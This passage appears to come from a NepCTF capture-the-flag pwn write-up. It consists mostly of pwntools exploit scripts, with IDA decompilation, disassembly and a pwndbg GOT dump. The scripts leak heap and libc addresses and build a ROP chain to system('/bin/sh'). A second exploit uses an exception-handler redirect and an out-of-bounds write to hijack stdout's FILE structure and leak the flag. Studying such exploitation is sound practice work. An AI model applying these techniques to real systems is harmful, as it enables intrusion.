def man_read_usr(Id):
    ch(1)
    io.sendafter(b"visit user(MANAGER_visit)n",b"MANAGER_visit")
    io.sendlineafter(b"1-19: manager can visit",str(Id).encode())
    io.sendlineafter(b"2: manager visit user to write to user_logs",b"1")
def get_right():
    ch(1000)
    io.sendafter(b"user write to logs(USER_write)n",b"MANAGER_visit")
    io.sendlineafter(b"10-19: user can visitn",str(0).encode())
man_read(0)
bug()
io.recvuntil(b"x01x00x00x00x00x00x00x00")
heap=u64(io.recv(8))-0x22d0
pie=u64(io.recv(8))-0x41a0
print(f"heap=>{hex(heap)}")
print(f"pie=>{hex(pie)}")
usr_write(10,b'a'*0x50)
get_right()

head=heap+0x2a0
man_write_usr(0,p64(0)+p64(heap+0x22d0)+p64(head+0x18)+p64(head+0x20)+p64(head+0x28)+p64(pie+0x4068))
man_write_usr(0,p64(0xf))
man_write(0,p64(0)+p64(heap+0x22d0)+p64(head+0x18)+p64(head+0x20)+p64(head+0x28)+p64(pie+0x4020))
man_read_usr(0)
io.recvline()
#===
base=u64(io.recv(8))-0x21b780
print(f"base=>{hex(base)}")
stack=base+libc.sym.environ
man_write(0,p64(0)+p64(heap+0x22d0)+p64(head+0x18)+p64(head+0x20)+p64(head+0x28)+p64(stack))
man_read_usr(0)
io.recvline()
stack=u64(io.recv(8))
print(f"stack=>{hex(stack)}")
man_write(0,p64(0)+p64(heap+0x22d0)+p64(head+0x18)+p64(head+0x20)+p64(head+0x28)+p64(stack-0x150))
#-0x150
rdi=base+0x000000000002a3e5
system=base+0x50d70
bin_sh=base+0x00000000001d8678

payload=p64(rdi+1)+p64(rdi)+p64(bin_sh)+p64(system)
man_write_usr(0,payload)

io.interactive()

#NepCTF{8e23f408-a803-a4fd-6766-cda58af313ee}
```



```
void __fastcall __noreturn main(void *a1, char **a2, char **a3){
int v3; // [rsp+4h] [rbp-2Ch] BYREF
unsigned __int64 v4; // [rsp+18h] [rbp-18h]

  v4 = __readfsqword(0x28u);
init();
while ( 1 )
  {
while ( 1 )
    {
menu(a1, a2);
      a2 = (char **)&v3;
      a1 = &std::cin;
      std::istream::operator>>(&std::cin, &v3);
if ( v3 != 1 )
break;
visit();
    }
if ( v3 != 2 )
exit(0);
leave();
  }
}
```



```
void init()
{
  setbuf(stdout, 0LL);
  setbuf(stdin, 0LL);
  setbuf(stderr, 0LL);
  stream = fopen("flag", "r");
if ( stream )
  {
if ( fgets(byte_4053C0, 64, stream) )
    {
      qword_4053B0 = seccomp_init(0LL);
if ( qword_4053B0 )
      {
        seccomp_rule_add(qword_4053B0, 2147418112LL, 0LL, 0LL);
        seccomp_rule_add(qword_4053B0, 2147418112LL, 1LL, 0LL);
        seccomp_rule_add(qword_4053B0, 2147418112LL, 3LL, 0LL);
        seccomp_rule_add(qword_4053B0, 2147418112LL, 202LL, 0LL);
        seccomp_load(qword_4053B0);
      }
else
      {
        perror("seccomp_init");
      }
    }
else
    {
      perror("Error reading flag");
    }
  }
else
  {
    perror("Error opening flag");
  }
}
```



```
.text:0000000000401F19 ;   catch(char const*) // owned by 401ED4
.text:0000000000401F19                 endbr64
.text:0000000000401F1D                 cmp     rdx, 1
.text:0000000000401F21                 jz      short loc_401F2B
.text:0000000000401F23                 mov     rdi, rax        ; struct _Unwind_Exception *
.text:0000000000401F26                 call    __Unwind_Resume
.text:0000000000401F2B ; ---------------------------------------------------------------------------
.text:0000000000401F2B
.text:0000000000401F2B loc_401F2B:                             ; CODE XREF: main+6E↑j
.text:0000000000401F2B                 mov     rdi, rax        ; void *
.text:0000000000401F2E                 call    ___cxa_begin_catch
.text:0000000000401F33                 mov     [rbp+var_20], rax
.text:0000000000401F37 ;   try {
.text:0000000000401F37                 call    sub_4016EC
```



```
.text:0000000000401F7B ;   catch(char const*) // owned by 401EEA
.text:0000000000401F7B                 endbr64
.text:0000000000401F7F                 cmp     rdx, 1
.text:0000000000401F83                 jz      short loc_401F8D
.text:0000000000401F85                 mov     rdi, rax        ; struct _Unwind_Exception *
.text:0000000000401F88                 call    __Unwind_Resume
.text:0000000000401F8D ; ---------------------------------------------------------------------------
.text:0000000000401F8D
.text:0000000000401F8D loc_401F8D:                             ; CODE XREF: main+D0↑j
.text:0000000000401F8D                 mov     rdi, rax        ; void *
.text:0000000000401F90                 call    ___cxa_begin_catch
.text:0000000000401F95                 mov     [rbp+var_28], rax
.text:0000000000401F99                 lea     rax, aYouCatchTheErr ; "you catch the error "
.text:0000000000401FA0                 mov     rsi, rax
.text:0000000000401FA3                 lea     rax, _ZSt4cout  ; std::cout
.text:0000000000401FAA                 mov     rdi, rax
.text:0000000000401FAD ;   try {
.text:0000000000401FAD                 call    __ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc ; std::operator<<<std::char_traits<char>>(std::ostream &,char const*)
.text:0000000000401FB2                 mov     rdx, rax
.text:0000000000401FB5                 mov     rax, [rbp+var_28]
.text:0000000000401FB9                 mov     rsi, rax
.text:0000000000401FBC                 mov     rdi, rdx
.text:0000000000401FBF                 call    __ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc ; std::operator<<<std::char_traits<char>>(std::ostream &,char const*)
.text:0000000000401FC4                 mov     rdx, cs:_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6__ptr
.text:0000000000401FCB                 mov     rsi, rdx
.text:0000000000401FCE                 mov     rdi, rax
.text:0000000000401FD1                 call    __ZNSolsEPFRSoS_E ; std::ostream::operator<<(std::ostream & (*)(std::ostream &))
.text:0000000000401FD6                 lea     rax, aHereIsAGiftFor ; "here is a gift for you!"
.text:0000000000401FDD                 mov     rsi, rax
.text:0000000000401FE0                 lea     rax, _ZSt4cout  ; std::cout
.text:0000000000401FE7                 mov     rdi, rax
.text:0000000000401FEA                 call    __ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc ; std::operator<<<std::char_traits<char>>(std::ostream &,char const*)
.text:0000000000401FEF                 mov     rdx, cs:_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6__ptr
.text:0000000000401FF6                 mov     rsi, rdx
.text:0000000000401FF9                 mov     rdi, rax
.text:0000000000401FFC                 call    __ZNSolsEPFRSoS_E ; std::ostream::operator<<(std::ostream & (*)(std::ostream &))
.text:0000000000402001                 mov     rax, cs:setbuf_ptr
.text:0000000000402008                 mov     rsi, rax
.text:000000000040200B                 lea     rax, format     ; "setbufaddr:%pn"
.text:0000000000402012                 mov     rdi, rax        ; format
.text:0000000000402015                 mov     eax, 0
.text:000000000040201A                 call    _printf
.text:000000000040201F                 lea     rax, [rbp+var_2C]
.text:0000000000402023                 mov     rsi, rax
.text:0000000000402026                 lea     rax, aStackaddrP ; "stackaddr:%pn"
.text:000000000040202D                 mov     rdi, rax        ; format
.text:0000000000402030                 mov     eax, 0
.text:0000000000402035                 call    _printf
.text:0000000000402035 ;   } // starts at 401FAD
.text:000000000040203A                 call    ___cxa_end_catch
.text:000000000040203F                 jmp     loc_401ED4
.text:0000000000402044 ; ---------------------------------------------------------------------------
.text:0000000000402044 ;   cleanup() // owned by 401FAD
```



```
unsigned __int64 visit()
{
  __int64 v0; // rax
  __int64 v1; // rax
  __int64 v2; // rax
  __int64 v3; // rax
  __int64 v4; // rax
  __int64 v5; // rax
  __int64 v6; // rax
  __int64 v7; // rax
  _QWORD *exception; // rax
  __int64 v9; // rax
  __int64 v10; // rax
  __int64 v11; // rax
  __int64 v12; // rax
  __int64 v13; // rax
  int v15; // [rsp+8h] [rbp-18h] BYREF
  int v16; // [rsp+Ch] [rbp-14h] BYREF
  int i; // [rsp+10h] [rbp-10h]
  int j; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v19; // [rsp+18h] [rbp-8h]

  v19 = __readfsqword(0x28u);
  v0 = std::operator<<<std::char_traits<char>>(&std::cout, "going to nep...");
  std::ostream::operator<<(v0, &std::endl<char,std::char_traits<char>>);
  v1 = std::operator<<<std::char_traits<char>>(&std::cout, "you are in nep!");
  std::ostream::operator<<(v1, &std::endl<char,std::char_traits<char>>);
  v2 = std::operator<<<std::char_traits<char>>(&std::cout, "you meet a crossing");
  std::ostream::operator<<(v2, &std::endl<char,std::char_traits<char>>);
  v3 = std::operator<<<std::char_traits<char>>(&std::cout, "you can choose your path");
  std::ostream::operator<<(v3, &std::endl<char,std::char_traits<char>>);
  v4 = std::operator<<<std::char_traits<char>>(&std::cout, "1.left");
  std::ostream::operator<<(v4, &std::endl<char,std::char_traits<char>>);
  v5 = std::operator<<<std::char_traits<char>>(&std::cout, "2.right");
  std::ostream::operator<<(v5, &std::endl<char,std::char_traits<char>>);
  v6 = std::operator<<<std::char_traits<char>>(&std::cout, "3.stright");
  std::ostream::operator<<(v6, &std::endl<char,std::char_traits<char>>);
  std::operator<<<std::char_traits<char>>(&std::cout, "your choice >>");
  std::istream::operator>>(&std::cin, &v15);
if ( v15 == 1 )                               // left-->create
  {
for ( i = 0; i <= 1; ++i )
    {
if ( *((_QWORD *)&chunk_list + i) )
      {
if ( i == 1 )
        {
          v10 = std::operator<<<std::char_traits<char>>(&std::cout, "no free chunks");
          std::ostream::operator<<(v10, &std::endl<char,std::char_traits<char>>);
        }
      }
else
      {
if ( size_list[i] )
        {
if ( size_list[i] <= 0 )
          {
            exception = __cxa_allocate_exception(8uLL);
            *exception = "invalid size";
            __cxa_throw(exception, (struct type_info *)&`typeinfo for'charconst*, 0LL);
          }
          *((_QWORD *)&chunk_list + i) = malloc(size_list[i]);
if ( *((_QWORD *)&chunk_list + i) )
            v7 = std::operator<<<std::char_traits<char>>(&std::cout, "malloc success");
else
            v7 = std::operator<<<std::char_traits<char>>(&std::cout, "malloc failed");
          std::ostream::operator<<(v7, &std::endl<char,std::char_traits<char>>);
break;
        }
        v9 = std::operator<<<std::char_traits<char>>(&std::cout, "invalid size");
        std::ostream::operator<<(v9, &std::endl<char,std::char_traits<char>>);
      }
    }
  }
if ( v15 == 2 )
  {
for ( j = 0; j <= 1; ++j )
    {
if ( !size_list[j] )
      {
        std::operator<<<std::char_traits<char>>(&std::cout, "size:");
        __isoc99_scanf("%d", &size_list[j]);
break;
      }
if ( j == 1 )
      {
        v11 = std::operator<<<std::char_traits<char>>(&std::cout, "no more size");
        std::ostream::operator<<(v11, &std::endl<char,std::char_traits<char>>);
      }
    }
  }
if ( v15 == 3 )
  {
    std::operator<<<std::char_traits<char>>(&std::cout, "index:");
    __isoc99_scanf("%d", &v16);
if ( *((_QWORD *)&chunk_list + v16) )
    {
      std::operator<<<std::char_traits<char>>(&std::cout, "content:");
if ( read(0, *((void **)&chunk_list + v16), size_list[v16]) > 0 )
      {
        v13 = std::operator<<<std::char_traits<char>>(&std::cout, "success");
        std::ostream::operator<<(v13, &std::endl<char,std::char_traits<char>>);
      }
    }
else
    {
      v12 = std::operator<<<std::char_traits<char>>(&std::cout, "invalid index");
      std::ostream::operator<<(v12, &std::endl<char,std::char_traits<char>>);
    }
  }
return v19 - __readfsqword(0x28u);
}
```



```
if ( size_list[v5] > 16 )
      {
        exception = __cxa_allocate_exception(8uLL);
        *exception = "stack overflow";
        __cxa_throw(exception, (struct type_info *)&`typeinfo for'charconst*, 0LL);
      }
```



```
00:0000│  0x405000 —▸ 0x404dd8 ◂— 1
01:0008│  0x405008 —▸ 0x7ffff7ffe2e0 ◂— 0
02:0010│  0x405010 —▸ 0x7ffff7fd8d30 ◂— endbr64 
03:0018│  0x405018 (printf@got[plt]) —▸ 0x401030 ◂— endbr64 
04:0020│  0x405020 (strcspn@got[plt]) —▸ 0x401040 ◂— endbr64 
05:0028│  0x405028 (__cxa_begin_catch@got.plt) —▸ 0x401050 ◂— endbr64 
06:0030│  0x405030 (__cxa_allocate_exception@got.plt) —▸ 0x401060 ◂— endbr64 
07:0038│  0x405038 (std::istream::operator>>(int&)@got.plt) —▸ 0x7ffff7d2c3e0 (std::istream::operator>>(int&)) ◂— endbr64 
08:0040│  0x405040 (memcpy@got[plt]) —▸ 0x401080 ◂— endbr64 
09:0048│  0x405048 (perror@got[plt]) —▸ 0x401090 ◂— endbr64 
0a:0050│  0x405050 (__cxa_atexit@got.plt) —▸ 0x7ffff78458c0 (__cxa_atexit) ◂— endbr64 
0b:0058│  0x405058 (std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, charconst*)@got.plt) —▸ 0x7ffff7d49660 (std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, charconst*)) ◂— endbr64 
0c:0060│  0x405060 (std::ostream::operator<<(std::ostream& (*)(std::ostream&))@got.plt) —▸ 0x7ffff7d47fe0 (std::ostream::operator<<(std::ostream& (*)(std::ostream&))) ◂— endbr64 
0d:0068│  0x405068 (__stack_chk_fail@got.plt) —▸ 0x4010d0 ◂— endbr64 
0e:0070│  0x405070 (__isoc99_scanf@got.plt) —▸ 0x4010e0 ◂— endbr64 
0f:0078│  0x405078 (fopen@got[plt]) —▸ 0x7ffff787f6b0 (fopen64) ◂— endbr64 
10:0080│  0x405080 (exit@got[plt]) —▸ 0x401100 ◂— endbr64 
11:0088│  0x405088 (malloc@got[plt]) —▸ 0x401110 ◂— endbr64 
12:0090│  0x405090 (read@got[plt]) —▸ 0x401120 ◂— endbr64 
13:0098│  0x405098 (std::ios_base::Init::Init()@got.plt) —▸ 0x7ffff7cc8c10 (std::ios_base_library_init()) ◂— endbr64 
14:00a0│  0x4050a0 (seccomp_rule_add@got[plt]) —▸ 0x7ffff7f97800 (seccomp_rule_add) ◂— endbr64 
15:00a8│  0x4050a8 (fgets@got[plt]) —▸ 0x7ffff787f400 (fgets) ◂— endbr64 
16:00b0│  0x4050b0 (__cxa_end_catch@got.plt) —▸ 0x401160 ◂— endbr64 
17:00b8│  0x4050b8 (__cxa_throw@got.plt) —▸ 0x401170 ◂— endbr64 
18:00c0│  0x4050c0 (_Unwind_Resume@got.plt) —▸ 0x401180 ◂— endbr64 
19:00c8│  0x4050c8 (seccomp_init@got[plt]) —▸ 0x7ffff7f963e0 (seccomp_init) ◂— endbr64 
1a:00d0│  0x4050d0 (seccomp_load@got[plt]) —▸ 0x7ffff7f96c50 (seccomp_load) ◂— endbr64 
1b:00d8│  0x4050d8 (close@got[plt]) —▸ 0x4011b0 ◂— endbr64 
1c:00e0│  0x4050e0 ◂— 0
1d:00e8│  0x4050e8 ◂— 0
1e:00f0│  0x4050f0 —▸ 0x404db8 (typeinfo for char const*) —▸ 0x7ffff7e5db70 (vtable for __cxxabiv1::__pointer_type_info+16) —▸ 0x7ffff7cb7a40 (__cxxabiv1::__pointer_type_info::~__pointer_type_info()) ◂— endbr64 
1f:00f8│  0x4050f8 —▸ 0x7ffff7cb6420 (__gxx_personality_v0) ◂— endbr64 
20:0100│  0x405100 (stdout) —▸ 0x7ffff7a1a780 (_IO_2_1_stdout_) ◂— 0xfbad2887
21:0108│  0x405108 ◂— 0
22:0110│  0x405110 (stdin) —▸ 0x7ffff7a19aa0 (_IO_2_1_stdin_) ◂— 0xfbad208b
23:0118│  0x405118 ◂— 0
... ↓     4 skipped
28:0140│  0x405140 (std::cout) —▸ 0x7ffff7e63310 (vtable for std::ostream+24) —▸ 0x7ffff7d47cb0 (std::basic_ostream<char, std::char_traits<char> >::~basic_ostream()) ◂— endbr64 
29:0148│  0x405148 (std::cout+8) —▸ 0x7ffff7e63338 (vtable for std::ostream+64) —▸ 0x7ffff7d47cf0 (virtual thunk to std::basic_ostream<char, std::char_traits<char> >::~basic_ostream()) ◂— endbr64 
2a:0150│  0x405150 (std::cout+16) ◂— 6
2b:0158│  0x405158 (std::cout+24) ◂— 0
2c:0160│  0x405160 (std::cout+32) ◂— 0x1002
2d:0168│  0x405168 (std::cout+40) ◂— 0
... ↓     2 skipped
30:0180│  0x405180 (std::cout+64) ◂— 0
... ↓     7 skipped
38:01c0│  0x4051c0 (std::cout+128) ◂— 0
... ↓     7 skipped
40:0200│  0x405200 (std::cout+192) ◂— 0
41:0208│  0x405208 (std::cout+200) ◂— 8
42:0210│  0x405210 (std::cout+208) —▸ 0x405188 (std::cout+72) ◂— 0
43:0218│  0x405218 (std::cout+216) —▸ 0x7ffff7e6ae20 ◂— 2
44:0220│  0x405220 (std::cout+224) ◂— 0
45:0228│  0x405228 (std::cout+232) ◂— 0
46:0230│  0x405230 (std::cout+240) —▸ 0x7ffff7e68ea0 —▸ 0x7ffff7e61a08 (vtable for __gnu_cxx::stdio_sync_filebuf<char, std::char_traits<char> >+16) —▸ 0x7ffff7d1de80 (__gnu_cxx::stdio_sync_filebuf<char, std::char_traits<char> >::~stdio_sync_filebuf()) ◂— endbr64 
47:0238│  0x405238 (std::cout+248) —▸ 0x7ffff7e6a840 —▸ 0x7ffff7e5f160 (vtable for std::ctype<char>+16) —▸ 0x7ffff7ce0780 (std::ctype<char>::~ctype()) ◂— endbr64 
48:0240│  0x405240 (std::cout+256) —▸ 0x7ffff7e6a7d0 —▸ 0x7ffff7e62d78 (vtable for std::num_put<char, std::ostreambuf_iterator<char, std::char_traits<char> > >+16) —▸ 0x7ffff7d33170 (std::num_put<char, std::ostreambuf_iterator<char, std::char_traits<char> > >::~num_put()) ◂— endbr64 
49:0248│  0x405248 (std::cout+264) —▸ 0x7ffff7e6a7e0 —▸ 0x7ffff7e62d00 (vtable for std::num_get<char, std::istreambuf_iterator<char, std::char_traits<char> > >+16) —▸ 0x7ffff7d33150 (std::num_get<char, std::istreambuf_iterator<char, std::char_traits<char> > >::~num_get()) ◂— endbr64 
4a:0250│  0x405250 ◂— 0
4b:0258│  0x405258 ◂— 0
4c:0260│  0x405260 (stderr) —▸ 0x7ffff7a1a6a0 (_IO_2_1_stderr_) ◂— 0xfbad2087
4d:0268│  0x405268 ◂— 0
... ↓     2 skipped
50:0280│  0x405280 (std::cin) —▸ 0x7ffff7e62870 (vtable for std::istream+24) —▸ 0x7ffff7d2b830 (std::basic_istream<char, std::char_traits<char> >::~basic_istream()) ◂— endbr64 
51:0288│  0x405288 (std::cin+8) ◂— 0
52:0290│  0x405290 (std::cin+16) —▸ 0x7ffff7e62898 (vtable for std::istream+64) —▸ 0x7ffff7d2b870 (virtual thunk to std::basic_istream<char, std::char_traits<char> >::~basic_istream()) ◂— endbr64 
53:0298│  0x405298 (std::cin+24) ◂— 6
54:02a0│  0x4052a0 (std::cin+32) ◂— 0
55:02a8│  0x4052a8 (std::cin+40) ◂— 0x1002
56:02b0│  0x4052b0 (std::cin+48) ◂— 0
57:02b8│  0x4052b8 (std::cin+56) ◂— 0
58:02c0│  0x4052c0 (std::cin+64) ◂— 0
... ↓     7 skipped
60:0300│  0x405300 (std::cin+128) ◂— 0
... ↓     7 skipped
68:0340│  0x405340 (std::cin+192) ◂— 0
69:0348│  0x405348 (std::cin+200) ◂— 0
6a:0350│  0x405350 (std::cin+208) ◂— 8
6b:0358│  0x405358 (std::cin+216) —▸ 0x4052d0 (std::cin+80) ◂— 0
6c:0360│  0x405360 (std::cin+224) —▸ 0x7ffff7e6ae20 ◂— 2
6d:0368│  0x405368 (std::cin+232) —▸ 0x405140 (std::cout) —▸ 0x7ffff7e63310 (vtable for std::ostream+24) —▸ 0x7ffff7d47cb0 (std::basic_ostream<char, std::char_traits<char> >::~basic_ostream()) ◂— endbr64 
6e:0370│  0x405370 (std::cin+240) ◂— 0
6f:0378│  0x405378 (std::cin+248) —▸ 0x7ffff7e68e40 —▸ 0x7ffff7e61a08 (vtable for __gnu_cxx::stdio_sync_filebuf<char, std::char_traits<char> >+16) —▸ 0x7ffff7d1de80 (__gnu_cxx::stdio_sync_filebuf<char, std::char_traits<char> >::~stdio_sync_filebuf()) ◂— endbr64 
pwndbg> 
70:0380│  0x405380 (std::cin+256) —▸ 0x7ffff7e6a840 —▸ 0x7ffff7e5f160 (vtable for std::ctype<char>+16) —▸ 0x7ffff7ce0780 (std::ctype<char>::~ctype()) ◂— endbr64 
71:0388│  0x405388 (std::cin+264) —▸ 0x7ffff7e6a7d0 —▸ 0x7ffff7e62d78 (vtable for std::num_put<char, std::ostreambuf_iterator<char, std::char_traits<char> > >+16) —▸ 0x7ffff7d33170 (std::num_put<char, std::ostreambuf_iterator<char, std::char_traits<char> > >::~num_put()) ◂— endbr64 
72:0390│  0x405390 (std::cin+272) —▸ 0x7ffff7e6a7e0 —▸ 0x7ffff7e62d00 (vtable for std::num_get<char, std::istreambuf_iterator<char, std::char_traits<char> > >+16) —▸ 0x7ffff7d33150 (std::num_get<char, std::istreambuf_iterator<char, std::char_traits<char> > >::~num_get()) ◂— endbr64 
73:0398│  0x405398 ◂— 0
74:03a0│  0x4053a0 —▸ 0x4182b0 ◂— 0xfbad2488
75:03a8│  0x4053a8 ◂— 0
76:03b0│  0x4053b0 —▸ 0x4194a0 ◂— 0xa1b2c3d4
77:03b8│  0x4053b8 ◂— 0
78:03c0│  0x4053c0 ◂— 'flag{aaaa}n'
79:03c8│  0x4053c8 ◂— 0xa7d61 /* 'a}n' */
7a:03d0│  0x4053d0 ◂— 0
```



```
from pwn import *
io=process('./pwn')
#io=remote("nepctf32-5vso-tlka-yawl-vfhkgz1bo235.nepctf.com",443,ssl=True,sni="nepctf32-5vso-tlka-yawl-vfhkgz1bo235.nepctf.com")
libc=ELF('./libc.so.6')
def ch(Id):
    io.sendlineafter(b"your choice >>",str(Id).encode())
def add(size):
    ch(1)
    ch(2)
    io.sendlineafter(b"size:",str(size).encode())
    ch(1)
    ch(1)
def edit(Id,payload):
    ch(1)
    ch(3)
    io.sendlineafter(b"index:",str(Id).encode())
    io.sendafter(b"content:",payload)
def bug():
    gdb.attach(io)
```



```
add(0x200)
payload=b'a'*0x20+p64(0x405338+0x2c-4)+p64(0x401F0B)#x+0x2c-8 
edit(0,payload)
ch(2)
io.sendlineafter(b"index:",str(0).encode())
io.recvuntil(b"setbufaddr:")
base=int(io.recvline()[:-1],16)-0x88060
success(f"base=>{hex(base)}")
_IO_2_1_stdout=base+0x21a780
```



```
ch(1)
ch(3)
io.sendlineafter(b"index:",str(-70).encode())
payload=p8(0)*0x80+p64(8)+p64(_IO_2_1_stdout)
io.send(payload)
```



```
ch(1)
ch(3)
io.sendlineafter(b"index:",str(-70).encode())
payload=p64(0xfbad1800)+p64(0)*3+p64(0x4053C0)+p64(0x4053C0+0x400)*2
io.send(payload)
```



```
from pwn import *
io=process('./pwn')
#io=remote("nepctf32-5vso-tlka-yawl-vfhkgz1bo235.nepctf.com",443,ssl=True,sni="nepctf32-5vso-tlka-yawl-vfhkgz1bo235.nepctf.com")
libc=ELF('./libc.so.6')
def ch(Id):
    io.sendlineafter(b"your choice >>",str(Id).encode())
def add(size):
    ch(1)
    ch(2)
    io.sendlineafter(b"size:",str(size).encode())
    ch(1)
    ch(1)
def edit(Id,payload):
    ch(1)
    ch(3)
    io.sendlineafter(b"index:",str(Id).encode())
    io.sendafter(b"content:",payload)
def bug():
    gdb.attach(io)
add(0x200)
payload=b'a'*0x20+p64(0x405338+0x2c-4)+p64(0x401F0B)#x+0x2c-8 
edit(0,payload)
ch(2)
io.sendlineafter(b"index:",str(0).encode())
io.recvuntil(b"setbufaddr:")
base=int(io.recvline()[:-1],16)-0x88060
success(f"base=>{hex(base)}")
_IO_2_1_stdout=base+0x21a780
ch(1)
ch(3)
io.sendlineafter(b"index:",str(-70).encode())
payload=p8(0)*0x80+p64(8)+p64(_IO_2_1_stdout)
io.send(payload)
#bug()
ch(1)
ch(3)
io.sendlineafter(b"index:",str(-70).encode())
payload=p64(0xfbad1800)+p64(0)*3+p64(0x4053C0)+p64(0x4053C0+0x400)*2
io.send(payload)
io.interactive()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1759121890-wxsync-2025-09-ba808c8dabd16e3bfa751b6ad8c3807f.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1759121892-wxsync-2025-09-201254787554b4082193681af482cc85.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1759121894-wxsync-2025-09-4bf57368e94022db6c514827b29250c3.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1759121895-wxsync-2025-09-2462333e7e69c248361e791050929816.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1759121897-wxsync-2025-09-5cbe92ef9cc5b6c5d7e1a40f498cac70.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1759121899-wxsync-2025-09-1c970967943d48725d5a3cd027c17aa9.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1759121901-wxsync-2025-09-edaa8c3ce897264850db8a0bdf5cb774.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1759121903-wxsync-2025-09-14abe112729d8ff20c6052eb8cbd33cb.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1759121908-wxsync-2025-09-71612baea187590d75a96ee2368782fc.webp)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1759121909-wxsync-2025-09-d2ca368f75092f5eee67f5eec75b95e9.gif)